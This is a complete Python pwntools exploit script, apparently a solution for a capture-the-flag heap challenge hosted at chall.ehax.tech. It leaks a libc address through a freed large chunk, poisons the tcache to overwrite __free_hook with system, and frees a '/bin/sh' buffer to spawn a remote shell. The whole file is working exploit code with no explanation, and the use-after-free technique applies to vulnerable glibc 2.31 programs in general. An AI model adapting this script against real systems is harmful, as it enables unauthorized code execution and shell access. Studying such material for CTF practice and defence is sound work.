#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = exe

p = process()
p = remote('chall.ehax.tech', 1925)

def malloc(idx,size,data):
    p.sendlineafter(b'> ',b'1')
    p.sendlineafter(b'> ',f'{idx}'.encode())
    p.sendlineafter(b'> ',f'{size}'.encode())
    p.sendlineafter(b'> ',data)

def free(idx):
    p.sendlineafter(b'> ',b'2')
    p.sendlineafter(b'> ',f'{idx}'.encode())

def edit(idx,data):
    p.sendlineafter(b'> ',b'3')
    p.sendlineafter(b'> ',f'{idx}'.encode())
    p.sendlineafter(b'> ',data)

def view(idx):
    p.sendlineafter(b'> ',b'4')
    p.sendlineafter(b'> ',f'{idx}'.encode())

malloc(0,0x70,b'/bin/sh\x00')
malloc(1,0x70,b'kuvee')
malloc(2,0x70,b'kuvee')
malloc(3,0x500,b'kuvee')
malloc(4,0x10,b'kuvee')

free(3)
view(3)

libc.address = u64(p.recv(6).ljust(8,b'\x00')) - 0x1ecbe0
log.info(f'leak libc: {hex(libc.address)}')

input()
free(1)
free(2)
edit(2,p64(libc.sym.__free_hook))
malloc(5,0x70,b'kuvee')
malloc(6,0x70,p64(libc.sym.system))
free(0)


p.interactive()
